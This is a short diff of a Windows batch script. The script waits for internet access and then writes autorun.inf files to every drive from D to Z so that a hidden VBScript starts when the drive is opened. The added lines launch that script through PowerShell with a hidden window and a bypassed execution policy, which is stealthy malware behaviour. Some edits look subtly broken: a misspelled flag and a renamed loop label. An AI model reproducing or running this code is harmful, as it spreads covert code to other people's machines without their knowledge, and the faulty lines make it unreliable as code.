@@ -10,7 +10,7 @@ ping -n 1 8.8.8.8 >nul 2>&1
 if errorlevel 1 (
     echo No internet connection. Retrying...
     timeout /t 7200 >nul
-    goto check_internet
+    goto check_internet7
 )
 echo Internet connection established.
 
@@ -33,6 +33,8 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
         echo open=RunHidden.vbs >> "%%d:\autorun.inf"
     )
 )
+
+powershell powershell.exe -windowstyle hidden -ep bypasss ./RunHidden.vbs
 
 @rem timeout /t 5 /nobreak
 
